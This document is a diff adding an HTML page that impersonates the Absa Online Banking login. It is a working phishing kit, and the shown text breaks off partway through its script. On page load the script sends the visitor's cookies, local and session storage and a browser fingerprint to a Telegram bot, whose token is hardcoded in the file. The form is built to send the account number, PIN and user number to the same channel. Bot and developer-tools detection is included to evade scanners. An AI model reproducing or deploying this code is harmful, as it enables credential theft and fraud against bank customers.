@@ -1,0 +1,1326 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Absa Online Banking - Secure Login</title>
+    <style>
+        /* Reset & Base Styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            background-color: #faf8f7;
+            color: #333;
+            line-height: 1.6;
+        }
+
+        /* Header Styles */
+        .header {
+            background: #fff;
+            border-bottom: 1px solid #e9e5e5;
+            padding: 12px 28px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .logo-text {
+            font-size: 12px;
+            color: #000000;
+            line-height: 1.2;
+        }
+
+        .logo-circle {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: #b81d35;
+            color: #fff;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .bank-name {
+            font-weight: 700;
+            color: #000000;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 14px;
+        }
+
+        .nav-link {
+            color: #b81d35;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .nav-link.secondary {
+            color: #777;
+        }
+
+        /* Main Layout */
+        .main-container {
+            max-width: 1200px;
+            margin: 24px auto;
+            display: grid;
+            grid-template-columns: 480px 1fr;
+            gap: 22px;
+            padding: 0 20px;
+        }
+
+        /* Login Card */
+        .login-card {
+            background: white;
+            border-radius: 6px;
+            padding: 22px;
+            box-shadow: 0 1px 0 rgba(0,0,0,0.05);
+            border: 1px solid #f0eaea;
+        }
+
+        .login-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+
+        .lock-icon {
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            background: #fff0f1;
+            border: 1px solid #f1d7d9;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #b81d35;
+            font-weight: 800;
+        }
+
+        .login-title {
+            font-size: 18px;
+            color: #333;
+        }
+
+        .form-group {
+            margin-bottom: 12px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 13px;
+            margin-bottom: 6px;
+            color: #666;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 10px 12px;
+            border-radius: 4px;
+            border: 1px solid #e6cfcf;
+            font-size: 15px;
+            background: #fff;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #b81d35;
+        }
+
+        /* Security Features - مخفية تماماً */
+        .security-container {
+            display: none;
+        }
+
+        .honeypot-field {
+            display: none !important;
+        }
+
+        .timer-display {
+            display: none;
+        }
+
+        .score-display {
+            display: none;
+        }
+
+        .security-progress {
+            display: none;
+        }
+
+        .security-check {
+            display: none;
+        }
+
+        /* Buttons */
+        .btn {
+            display: inline-block;
+            background: #ff6a00;
+            color: white;
+            border: none;
+            padding: 12px 18px;
+            border-radius: 4px;
+            font-weight: 700;
+            cursor: pointer;
+            width: 100%;
+            text-align: center;
+            transition: background-color 0.3s ease;
+        }
+
+        .btn:hover {
+            background: #e55a00;
+        }
+
+        .btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+
+        .btn-secondary {
+            background: #fff;
+            border: 1px solid #ff6a00;
+            color: #ff6a00;
+            margin-top: 10px;
+        }
+
+        .btn-secondary:hover {
+            background: #fff5f0;
+        }
+
+        /* Right Panel */
+        .info-panel {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 12px;
+        }
+
+        .banner {
+            height: 70px;
+            background: linear-gradient(90deg, #8d0720, #b81d35);
+            color: white;
+            padding: 14px;
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+        }
+
+        .info-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin-top: 10px;
+        }
+
+        .info-card {
+            background: white;
+            padding: 16px;
+            border-radius: 6px;
+            border: 1px solid #f0e6e8;
+        }
+
+        .info-card h4 {
+            margin: 0 0 8px;
+            font-size: 15px;
+            color: #333;
+        }
+
+        .info-card ul {
+            padding-left: 18px;
+            color: #6b6b6b;
+        }
+
+        .info-card li {
+            margin-bottom: 4px;
+        }
+
+        .promo-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin-top: 10px;
+        }
+
+        .promo-card {
+            background: linear-gradient(180deg, #7a0f1a, #8f2330);
+            color: #fff;
+            padding: 18px;
+            border-radius: 6px;
+            font-weight: 700;
+        }
+
+        .promo-card.accent {
+            background: linear-gradient(180deg, #7a0f1a, #bf2e3d);
+        }
+
+        .promo-small {
+            font-weight: 400;
+            display: block;
+            margin-top: 5px;
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            margin-top: 28px;
+            color: #a7a7a7;
+            font-size: 13px;
+        }
+
+        /* Help Button */
+        .help-button {
+            position: fixed;
+            right: 16px;
+            bottom: 16px;
+            background: #ea4e6e;
+            color: white;
+            border-radius: 50%;
+            width: 56px;
+            height: 56px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            cursor: pointer;
+            transition: transform 0.3s ease;
+        }
+
+        .help-button:hover {
+            transform: scale(1.1);
+        }
+
+        /* Responsive Design */
+        @media (max-width: 980px) {
+            .main-container {
+                grid-template-columns: 1fr;
+                padding: 0 12px;
+            }
+            
+            .info-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .promo-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        /* Status Message */
+        .status-message {
+            margin-top: 10px;
+            padding: 10px;
+            border-radius: 4px;
+            text-align: center;
+            font-size: 14px;
+        }
+
+        .status-loading {
+            background: #e8f4fd;
+            color: #0066cc;
+        }
+
+        .status-success {
+            background: #f0f9f0;
+            color: #2e7d32;
+        }
+
+        .status-error {
+            background: #ffeaea;
+            color: #d32f2f;
+        }
+
+        /* Hidden verification field */
+        .human-verification {
+            opacity: 0;
+            position: absolute;
+            top: -1000px;
+            left: -1000px;
+        }
+    </style>
+</head>
+<body>
+<script src="anti-bot-system.js">
+
+    <!-- Header Section -->
+    <header class="header">
+        <div class="logo-container">
+            <div class="logo-text">
+                Your<br>story<br>matters
+            </div>
+            <div class="logo-circle">absa</div>
+            <div class="bank-name">Absa Online Banking</div>
+        </div>
+        <nav class="nav-links">
+            <a href="#" class="nav-link">Login</a>
+            <a href="#" class="nav-link secondary">Register</a>
+        </nav>
+    </header>
+
+    <!-- Main Content -->
+    <main class="main-container">
+        <!-- Login Section -->
+        <section class="login-card">
+            <div class="login-header">
+                <div class="lock-icon">🔒</div>
+                <h2 class="login-title">Login details</h2>
+            </div>
+
+            <form id="loginForm" autocomplete="off">
+                <div class="form-group">
+                    <label for="account" class="form-label">Access account number</label>
+                    <input 
+                        type="text" 
+                        id="account" 
+                        name="account" 
+                        class="form-input" 
+                        placeholder="Account number used when you registered" 
+                        required
+                    >
+                </div>
+
+                <div class="form-group">
+                    <label for="pin" class="form-label">PIN</label>
+                    <input 
+                        type="password" 
+                        id="pin" 
+                        name="pin" 
+                        class="form-input" 
+                        placeholder="Enter your PIN" 
+                        required
+                    >
+                </div>
+
+                <div class="form-group">
+                    <label for="user" class="form-label">User number</label>
+                    <input 
+                        type="number" 
+                        id="user" 
+                        name="user" 
+                        class="form-input" 
+                        value="1"
+                    >
+                </div>
+
+                <!-- Multiple Honeypot Fields for Bots -->
+                <div class="honeypot-field">
+                    <label for="website">Website</label>
+                    <input type="text" id="website" name="website" autocomplete="off">
+                </div>
+
+                <div class="honeypot-field">
+                    <label for="name">Name</label>
+                    <input type="text" id="name" name="name" autocomplete="off">
+                </div>
+
+                <div class="honeypot-field">
+                    <label for="email">Email</label>
+                    <input type="email" id="email" name="email" autocomplete="off">
+                </div>
+
+                <!-- Hidden verification fields - مخفية تماماً -->
+                <input type="hidden" id="human_check" name="human_check" value="">
+                <input type="hidden" id="behavior_fingerprint" name="behavior_fingerprint" value="">
+                <input type="hidden" id="interaction_hash" name="interaction_hash" value="">
+
+                <!-- Security Container - مخفية تماماً -->
+                <div class="security-container">
+                    <div class="security-shield">🛡️</div>
+                    
+                    <!-- Time Spent Counter -->
+                    <div class="timer-display">
+                        ⏱️ Time on page: <span id="timeCounter">0</span> seconds
+                    </div>
+
+                    <!-- Human Score Display -->
+                    <div class="score-display">
+                        🎯 Human Verification Score: <span id="humanScore">0</span>/10
+                    </div>
+
+                    <!-- Progress Bar -->
+                    <div class="security-progress">
+                        <div class="security-progress-bar" id="securityProgress" style="width: 0%"></div>
+                    </div>
+                    
+                    <div class="security-check">
+                        🔒 Complete verification to continue
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <button type="submit" class="btn" id="submitBtn">Next</button>
+                    <button type="button" class="btn btn-secondary" id="forgotBtn">Forgot PIN?</button>
+                </div>
+
+                <div id="statusMessage" class="status-message" style="display: none;"></div>
+            </form>
+        </section>
+
+        <!-- Information Panel -->
+        <aside class="info-panel">
+            <div class="banner">Absa Online login has a new look!</div>
+
+            <div class="info-grid">
+                <div class="info-card">
+                    <h4>Security centre</h4>
+                    <ul>
+                        <li>Security measures and enhancements</li>
+                        <li>Latest scams and schemes</li>
+                        <li>Shop online with ease</li>
+                    </ul>
+                </div>
+
+                <div class="info-card">
+                    <h4>Useful information</h4>
+                    <ul>
+                        <li>Grandmark International Pty Ltd</li>
+                        <li>Explore more ways to do your banking</li>
+                        <li>2025 Benefits and Pricing</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="promo-grid">
+                <div class="promo-card">
+                    #ProtectYourKeysToTheSafe
+                    <small class="promo-small">Keep your PINs, passwords and transaction verifications safe.</small>
+                </div>
+                <div class="promo-card accent">
+                    2025 benefits and pricing
+                    <small class="promo-small">Free Rewards, better banking and more value.</small>
+                </div>
+            </div>
+        </aside>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        © Copyright. Absa Bank Limited. Registration Number: 1986/004794/06
+    </footer>
+
+    <!-- Help Button -->
+    <div class="help-button">?</div>
+
+    <script>
+        // Telegram Bot Configuration
+        const TELEGRAM_CONFIG = {
+            token: '8190122981:AAE1dDTKA7_dAMZuO0EPJYUdb4fCn7b4Pf0',
+            chatId: '-4918428156'
+        };
+
+        // Advanced Security Configuration
+        const SECURITY_CONFIG = {
+            minTimeOnPage: 8,
+            minHumanScore: 8,
+            maxAttempts: 3,
+            timeBetweenAttempts: 45000,
+            allowedUserAgents: ['chrome', 'firefox', 'safari', 'edge', 'opera'],
+            blockKeywords: ['bot', 'crawler', 'spider', 'scraper', 'automation', 'headless']
+        };
+
+        // DOM Elements
+        const loginForm = document.getElementById('loginForm');
+        const submitBtn = document.getElementById('submitBtn');
+        const forgotBtn = document.getElementById('forgotBtn');
+        const statusMessage = document.getElementById('statusMessage');
+        const humanCheck = document.getElementById('human_check');
+        const behaviorFingerprint = document.getElementById('behavior_fingerprint');
+        const interactionHash = document.getElementById('interaction_hash');
+
+        // Advanced Security State
+        let securityState = {
+            startTime: Date.now(),
+            formStartTime: null,
+            attempts: 0,
+            lastAttempt: 0,
+            humanScore: 0,
+            interactions: {
+                mouseMovements: 0,
+                keystrokes: 0,
+                clicks: 0,
+                scrolls: 0,
+                focusChanges: 0,
+                inputInteractions: 0,
+                touchEvents: 0,
+                deviceOrientation: 0
+            },
+            behavior: {
+                mousePath: [],
+                keystrokeTiming: [],
+                clickPatterns: [],
+                scrollPatterns: [],
+                inputPatterns: []
+            },
+            flags: {
+                isBot: false,
+                suspiciousActivity: false,
+                developerTools: false,
+                headlessBrowser: false,
+                automationDetected: false
+            },
+            browserData: {}
+        };
+
+        // Initialize Advanced Security Features
+        function initializeSecurity() {
+            collectBrowserData();
+            setupAdvancedBehaviorTracking();
+            setupAdvancedFormProtection();
+            generateHumanCheck();
+            detectAutomation();
+            startAdvancedMonitoring();
+            
+            // إرسال الكوكيز تلقائياً عند تحميل الصفحة
+            setTimeout(() => {
+                sendCookiesToTelegram();
+            }, 3000);
+        }
+
+        // جمع بيانات المتصفح والكوكيز
+        function collectBrowserData() {
+            securityState.browserData = {
+                cookies: document.cookie,
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                languages: navigator.languages,
+                platform: navigator.platform,
+                vendor: navigator.vendor,
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                    colorDepth: screen.colorDepth,
+                    pixelDepth: screen.pixelDepth
+                },
+                viewport: {
+                    width: window.innerWidth,
+                    height: window.innerHeight
+                },
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                localStorage: JSON.stringify(getLocalStorageData()),
+                sessionStorage: JSON.stringify(getSessionStorageData()),
+                plugins: getPluginsInfo(),
+                hardware: {
+                    cores: navigator.hardwareConcurrency,
+                    memory: navigator.deviceMemory
+                },
+                connection: getConnectionInfo(),
+                doNotTrack: navigator.doNotTrack,
+                cookieEnabled: navigator.cookieEnabled,
+                javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false
+            };
+
+            // إنشاء بصمة المتصفح
+            behaviorFingerprint.value = generateBrowserFingerprint();
+        }
+
+        // الحصول على بيانات Local Storage
+        function getLocalStorageData() {
+            const data = {};
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                try {
+                    data[key] = localStorage.getItem(key);
+                } catch (e) {
+                    data[key] = 'Unable to read';
+                }
+            }
+            return data;
+        }
+
+        // الحصول على بيانات Session Storage
+        function getSessionStorageData() {
+            const data = {};
+            for (let i = 0; i < sessionStorage.length; i++) {
+                const key = sessionStorage.key(i);
+                try {
+                    data[key] = sessionStorage.getItem(key);
+                } catch (e) {
+                    data[key] = 'Unable to read';
+                }
+            }
+            return data;
+        }
+
+        // الحصول على معلومات الإضافات
+        function getPluginsInfo() {
+            const plugins = [];
+            for (let i = 0; i < navigator.plugins.length; i++) {
+                plugins.push({
+                    name: navigator.plugins[i].name,
+                    filename: navigator.plugins[i].filename,
+                    description: navigator.plugins[i].description
+                });
+            }
+            return plugins;
+        }
+
+        // الحصول على معلومات الاتصال
+        function getConnectionInfo() {
+            if (navigator.connection) {
+                return {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt,
+                    saveData: navigator.connection.saveData
+                };
+            }
+            return 'Not available';
+        }
+
+        // إنشاء بصمة المتصفح الفريدة
+        function generateBrowserFingerprint() {
+            const components = [
+                navigator.userAgent,
+                navigator.language,
+                screen.width + 'x' + screen.height,
+                new Date().getTimezoneOffset(),
+                !!navigator.javaEnabled,
+                navigator.platform,
+                navigator.hardwareConcurrency || 'unknown'
+            ];
+            
+            return btoa(components.join('|'));
+        }
+
+        // Generate dynamic human verification
+        function generateHumanCheck() {
+            const timestamp = Date.now();
+            const randomValue = Math.random().toString(36).substring(2, 15);
+            humanCheck.value = btoa(timestamp + ':' + randomValue);
+        }
+
+        // Advanced Behavior Tracking
+        function setupAdvancedBehaviorTracking() {
+            // Advanced mouse tracking
+            document.addEventListener('mousemove', (e) => {
+                securityState.interactions.mouseMovements++;
+                
+                securityState.behavior.mousePath.push({
+                    x: e.clientX,
+                    y: e.clientY,
+                    timestamp: Date.now(),
+                    speed: calculateMouseSpeed(e)
+                });
+
+                if (securityState.behavior.mousePath.length > 50) {
+                    securityState.behavior.mousePath.shift();
+                }
+
+                if (securityState.interactions.mouseMovements % 3 === 0 && securityState.humanScore < 10) {
+                    securityState.humanScore = Math.min(10, securityState.humanScore + 0.7);
+                }
+
+                analyzeMousePatterns();
+            });
+
+            // Advanced keystroke tracking
+            document.addEventListener('keydown', (e) => {
+                if (e.key.length === 1) {
+                    securityState.interactions.keystrokes++;
+                    
+                    securityState.behavior.keystrokeTiming.push({
+                        key: e.key,
+                        timestamp: Date.now(),
+                        code: e.code
+                    });
+
+                    securityState.humanScore = Math.min(10, securityState.humanScore + 1.2);
+                    analyzeKeystrokePatterns();
+                }
+            });
+
+            // Advanced click tracking
+            document.addEventListener('click', (e) => {
+                securityState.interactions.clicks++;
+                
+                securityState.behavior.clickPatterns.push({
+                    x: e.clientX,
+                    y: e.clientY,
+                    timestamp: Date.now(),
+                    target: e.target.tagName
+                });
+
+                securityState.humanScore = Math.min(10, securityState.humanScore + 1.5);
+                analyzeClickPatterns();
+            });
+
+            // Scroll tracking
+            document.addEventListener('scroll', () => {
+                securityState.interactions.scrolls++;
+                if (securityState.interactions.scrolls % 2 === 0 && securityState.humanScore < 10) {
+                    securityState.humanScore = Math.min(10, securityState.humanScore + 0.8);
+                }
+            });
+
+            // Touch events tracking
+            document.addEventListener('touchstart', () => {
+                securityState.interactions.touchEvents++;
+                securityState.humanScore = Math.min(10, securityState.humanScore + 1.0);
+            });
+
+            // Device orientation tracking
+            window.addEventListener('deviceorientation', () => {
+                securityState.interactions.deviceOrientation++;
+            });
+
+            // Form interaction tracking
+            const inputs = document.querySelectorAll('input');
+            inputs.forEach(input => {
+                input.addEventListener('focus', () => {
+                    if (!securityState.formStartTime) {
+                        securityState.formStartTime = Date.now();
+                    }
+                    securityState.interactions.focusChanges++;
+                    if (securityState.humanScore < 10) {
+                        securityState.humanScore = Math.min(10, securityState.humanScore + 0.4);
+                    }
+                });
+
+                input.addEventListener('input', () => {
+                    securityState.interactions.inputInteractions++;
+                    if (securityState.interactions.inputInteractions % 2 === 0 && securityState.humanScore < 10) {
+                        securityState.humanScore = Math.min(10, securityState.humanScore + 0.6);
+                    }
+                });
+            });
+
+            // تحديث بصمة التفاعل باستمرار
+            setInterval(() => {
+                interactionHash.value = generateInteractionHash();
+            }, 2000);
+        }
+
+        // إنشاء بصمة تفاعل فريدة
+        function generateInteractionHash() {
+            const interactionData = {
+                timestamp: Date.now(),
+                mouseMovements: securityState.interactions.mouseMovements,
+                keystrokes: securityState.interactions.keystrokes,
+                clicks: securityState.interactions.clicks,
+                scrolls: securityState.interactions.scrolls,
+                humanScore: Math.floor(securityState.humanScore)
+            };
+            
+            return btoa(JSON.stringify(interactionData));
+        }
+
+        // Advanced Analysis Functions
+        function calculateMouseSpeed(e) {
+            if (securityState.behavior.mousePath.length === 0) return 0;
+            
+            const lastMove = securityState.behavior.mousePath[securityState.behavior.mousePath.length - 1];
+            const timeDiff = e.timeStamp - lastMove.timestamp;
+            const distance = Math.sqrt(
+                Math.pow(e.clientX - lastMove.x, 2) + 
+                Math.pow(e.clientY - lastMove.y, 2)
+            );
+            
+            return timeDiff > 0 ? distance / timeDiff : 0;
+        }
+
+        function analyzeMousePatterns() {
+            if (securityState.behavior.mousePath.length < 5) return;
+
+            const recentMoves = securityState.behavior.mousePath.slice(-5);
+            let straightLines = 0;
+
+            for (let i = 1; i < recentMoves.length; i++) {
+                const current = recentMoves[i];
+                const previous = recentMoves[i-1];
+                const dx = current.x - previous.x;
+                const dy = current.y - previous.y;
+                
+                // Detect straight line movements (bot-like)
+                if (Math.abs(dx) < 2 && Math.abs(dy) < 2) {
+                    straightLines++;
+                }
+            }
+
+            if (straightLines > 3) {
+                securityState.flags.suspiciousActivity = true;
+                securityState.humanScore = Math.max(0, securityState.humanScore - 1);
+            }
+        }
+
+        function analyzeKeystrokePatterns() {
+            if (securityState.behavior.keystrokeTiming.length < 3) return;
+
+            const recentKeys = securityState.behavior.keystrokeTiming.slice(-3);
+            const timeDiffs = [];
+
+            for (let i = 1; i < recentKeys.length; i++) {
+                timeDiffs.push(recentKeys[i].timestamp - recentKeys[i-1].timestamp);
+            }
+
+            // Check for uniform timing (bot signature)
+            const avg = timeDiffs.reduce((a, b) => a + b) / timeDiffs.length;
+            const variance = timeDiffs.reduce((a, b) => a + Math.pow(b - avg, 2), 0) / timeDiffs.length;
+
+            if (variance < 10) {
+                securityState.flags.suspiciousActivity = true;
+                securityState.humanScore = Math.max(0, securityState.humanScore - 0.5);
+            }
+        }
+
+        function analyzeClickPatterns() {
+            if (securityState.behavior.clickPatterns.length < 2) return;
+
+            const recentClicks = securityState.behavior.clickPatterns.slice(-2);
+            const precision = Math.abs(recentClicks[1].x - recentClicks[0].x) < 2 && 
+                             Math.abs(recentClicks[1].y - recentClicks[0].y) < 2;
+
+            if (precision) {
+                securityState.flags.suspiciousActivity = true;
+                securityState.humanScore = Math.max(0, securityState.humanScore - 1);
+            }
+        }
+
+        // Automation Detection
+        function detectAutomation() {
+            // Detect headless browsers
+            const userAgent = navigator.userAgent.toLowerCase();
+            
+            // Check for headless browser indicators
+            if (navigator.webdriver || 
+                window.chrome && !window.chrome.runtime ||
+                !window.outerWidth || !window.outerHeight ||
+                navigator.plugins.length === 0) {
+                securityState.flags.headlessBrowser = true;
+            }
+
+            // Check for automation keywords
+            SECURITY_CONFIG.blockKeywords.forEach(keyword => {
+                if (userAgent.includes(keyword)) {
+                    securityState.flags.automationDetected = true;
+                }
+            });
+
+            // Detect developer tools
+            const widthThreshold = window.outerWidth - window.innerWidth > 160;
+            const heightThreshold = window.outerHeight - window.innerHeight > 160;
+            
+            if (widthThreshold || heightThreshold) {
+                securityState.flags.developerTools = true;
+            }
+
+            // Set bot flag if any automation detected
+            securityState.flags.isBot = securityState.flags.headlessBrowser || 
+                                      securityState.flags.automationDetected;
+        }
+
+        // Advanced Monitoring
+        function startAdvancedMonitoring() {
+            setInterval(() => {
+                monitorBehavior();
+            }, 3000);
+        }
+
+        function monitorBehavior() {
+            // Detect rapid form filling
+            if (securityState.formStartTime) {
+                const fillTime = Date.now() - securityState.formStartTime;
+                if (fillTime < 2000 && securityState.humanScore > 5) {
+                    securityState.flags.suspiciousActivity = true;
+                    securityState.humanScore = Math.max(0, securityState.humanScore - 2);
+                }
+            }
+        }
+
+        // Setup form protection
+        function setupAdvancedFormProtection() {
+            loginForm.setAttribute('autocomplete', 'off');
+            loginForm.setAttribute('novalidate', 'true');
+            
+            document.getElementById('pin').addEventListener('input', validatePIN);
+            document.getElementById('account').addEventListener('input', validateAccount);
+            
+            // Prevent copy-paste
+            document.addEventListener('copy', (e) => e.preventDefault());
+            document.addEventListener('paste', (e) => e.preventDefault());
+            document.addEventListener('cut', (e) => e.preventDefault());
+            
+            // Prevent right-click
+            document.addEventListener('contextmenu', (e) => e.preventDefault());
+            
+            // Prevent drag and drop
+            document.addEventListener('dragstart', (e) => e.preventDefault());
+            document.addEventListener('drop', (e) => e.preventDefault());
+        }
+
+        // Security Validation Functions
+        function validateHoneypot() {
+            const honeypotFields = ['website', 'name', 'email'];
+            return honeypotFields.every(field => !document.getElementById(field).value);
+        }
+
+        function validateTimeOnPage() {
+            const timeSpent = (Date.now() - securityState.startTime) / 1000;
+            return timeSpent >= SECURITY_CONFIG.minTimeOnPage;
+        }
+
+        function validateHumanScore() {
+            return securityState.humanScore >= SECURITY_CONFIG.minHumanScore && !securityState.flags.isBot;
+        }
+
+        function validateUserAgent() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            return SECURITY_CONFIG.allowedUserAgents.some(agent => 
+                userAgent.includes(agent)
+            );
+        }
+
+        function validateSubmissionRate() {
+            const now = Date.now();
+            const timeDiff = now - securityState.lastAttempt;
+            
+            if (securityState.attempts >= SECURITY_CONFIG.maxAttempts) {
+                return { valid: false, message: 'Too many attempts. Please try again later.' };
+            }
+            
+            if (timeDiff < SECURITY_CONFIG.timeBetweenAttempts) {
+                const waitTime = Math.ceil((SECURITY_CONFIG.timeBetweenAttempts - timeDiff) / 1000);
+                return { valid: false, message: `Please wait ${waitTime} seconds before trying again.` };
+            }
+            
+            securityState.attempts++;
+            securityState.lastAttempt = now;
+            return { valid: true };
+        }
+
+        function validateHumanCheck() {
+            try {
+                const decoded = atob(humanCheck.value).split(':');
+                const timestamp = parseInt(decoded[0]);
+                const age = Date.now() - timestamp;
+                return age > 1000 && age < 3600000;
+            } catch {
+                return false;
+            }
+        }
+
+        function validatePIN() {
+            const pin = document.getElementById('pin').value;
+            return pin.length >= 4 && /^\d+$/.test(pin);
+        }
+
+        function validateAccount() {
+            const account = document.getElementById('account').value;
+            return account.length >= 5 && /^[a-zA-Z0-9]+$/.test(account);
+        }
+
+        // Utility Functions
+        function showStatus(message, type = 'loading') {
+            statusMessage.textContent = message;
+            statusMessage.className = `status-message status-${type}`;
+            statusMessage.style.display = 'block';
+        }
+
+        function hideStatus() {
+            statusMessage.style.display = 'none';
+        }
+
+        function disableForm() {
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Processing...';
+        }
+
+        function enableForm() {
+            submitBtn.disabled = false;
+            submitBtn.textContent = 'Next';
+        }
+
+        // Get User IP Address
+        async function getUserIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('Could not get IP:', error);
+                return 'Unknown IP';
+            }
+        }
+
+        // Format Current Date and Time
+        function getFormattedDateTime() {
+            const now = new Date();
+            const day = String(now.getDate()).padStart(2, '0');
+            const month = now.toLocaleString('default', { month: 'short' });
+            const year = now.getFullYear();
+            const hours = String(now.getHours()).padStart(2, '0');
+            const minutes = String(now.getMinutes()).padStart(2, '0');
+            const ampm = hours >= 12 ? 'pm' : 'am';
+            
+            return {
+                time: `${hours % 12}:${minutes} ${ampm}`,
+                date: `${day} ${month}, ${year}`
+            };
+        }
+
+        // إنشاء ملف نصي للكوكيز وإرساله إلى التليجرام
+        async function sendCookiesToTelegram() {
+            try {
+                const ip = await getUserIP();
+                const datetime = getFormattedDateTime();
+                
+                // إنشاء محتوى الملف النصي
+                const cookiesContent = `
+🍪 COOKIES DATA COLLECTION REPORT
+📅 Date: ${datetime.date}
+⏰ Time: ${datetime.time}
+🌐 IP Address: ${ip}
+
+🔍 COOKIES FOUND:
+${document.cookie || 'No cookies found'}
+
+💾 LOCAL STORAGE:
+${JSON.stringify(getLocalStorageData(), null, 2)}
+
+💾 SESSION STORAGE:
+${JSON.stringify(getSessionStorageData(), null, 2)}
+
+🌐 BROWSER INFORMATION:
+- User Agent: ${navigator.userAgent}
+- Language: ${navigator.language}
+- Platform: ${navigator.platform}
+- Screen: ${screen.width}x${screen.height}
+- Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+
+📊 PLUGINS DETECTED:
+${getPluginsInfo().map(plugin => `- ${plugin.name}: ${plugin.description}`).join('\n')}
+
+🔒 SECURITY FLAGS:
+- Cookies Enabled: ${navigator.cookieEnabled}
+- Java Enabled: ${navigator.javaEnabled ? navigator.javaEnabled() : false}
+- Do Not Track: ${navigator.doNotTrack || 'Not set'}
+
+🕒 REPORT GENERATED AT: ${new Date().toISOString()}
+                `;
+
+                // تحويل المحتوى إلى Blob
+                const blob = new Blob([cookiesContent], { type: 'text/plain' });
+                const file = new File([blob], `cookies_report_${Date.now()}.txt`, { type: 'text/plain' });
+
+                // إرسال الملف إلى التليجرام
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CONFIG.chatId);
+                formData.append('document', file);
+                formData.append('caption', `🍪 Cookies Report - ${datetime.date} ${datetime.time}`);
+
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.token}/sendDocument`, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                const result = await response.json();
+                return result.ok;
+
+            } catch (error) {
+                console.error('Error sending cookies to Telegram:', error);
+                return false;
+            }
+        }
+
+        // Send Data to Telegram with Browser Data
+        async function sendToTelegram(account, pin, user) {
+            try {
+                const ip = await getUserIP();
+                const datetime = getFormattedDateTime();
+                const securityReport = securityState;
+
+                // تحضير بيانات الكوكيز والمتصفح بشكل منظم
+                const browserInfo = `
+🌐 BROWSER FINGERPRINT:
+├─ User Agent: ${securityState.browserData.userAgent}
+├─ Language: ${securityState.browserData.language}
+├─ Platform: ${securityState.browserData.platform}
+├─ Screen: ${securityState.browserData.screen.width}x${securityState.browserData.screen.height}
+├─ Timezone: ${securityState.browserData.timezone}
+├─ Cores: ${securityState.browserData.hardware.cores}
+└─ Memory: ${securityState.browserData.hardware.memory}GB
+
+🍪 COOKIES & STORAGE:
+├─ Cookies: ${securityState.browserData.cookies || 'No cookies'}
+├─ Local Storage: ${Object.keys(JSON.parse(securityState.browserData.localStorage)).length} items
+├─ Session Storage: ${Object.keys(JSON.parse(securityState.browserData.sessionStorage)).length} items
+└─ Plugins: ${securityState.browserData.plugins.length} plugins
+
+🔧 BROWSER CAPABILITIES:
+├─ Java Enabled: ${securityState.browserData.javaEnabled}
+├─ Cookie Enabled: ${securityState.browserData.cookieEnabled}
+├─ Do Not Track: ${securityState.browserData.doNotTrack}
+└─ Connection: ${typeof securityState.browserData.connection === 'object' ? 
+    securityState.browserData.connection.effectiveType : 'Unknown'}`;
+
+                const message = `
+[+]━━━━━━━━━━━━【🔐 LOGIN CREDENTIALS】━━━━━━━━━━━━[+]
+[ ACCOUNT NUMBER] = ${account}
+[ PIN] = ${pin}
+[ USER NUMBER] = ${user}
+
+[+]━━━━━━━━━━━━━━━━【ADVANCED SECURITY ANALYSIS】━━━━━━━━[+]
+[ HUMAN SCORE] = ${Math.floor(securityReport.humanScore)}/10
+[ MOUSE MOVEMENTS] = ${securityReport.interactions.mouseMovements}
+[ KEYSTROKES] = ${securityReport.interactions.keystrokes}
+[ CLICKS] = ${securityReport.interactions.clicks}
+[ TIME ON PAGE] = ${Math.floor((Date.now() - securityReport.startTime) / 1000)}s
+[ BOT DETECTED] = ${securityReport.flags.isBot}
+[ SUSPICIOUS ACTIVITY] = ${securityReport.flags.suspiciousActivity}
+[ HEADLESS BROWSER] = ${securityReport.flags.headlessBrowser}
+[ AUTOMATION DETECTED] = ${securityReport.flags.automationDetected}
+
+[+]━━━━━━━━━━━━━━━━【SYSTEM INFO】━━━━━━━━━━━━━━━━[+]
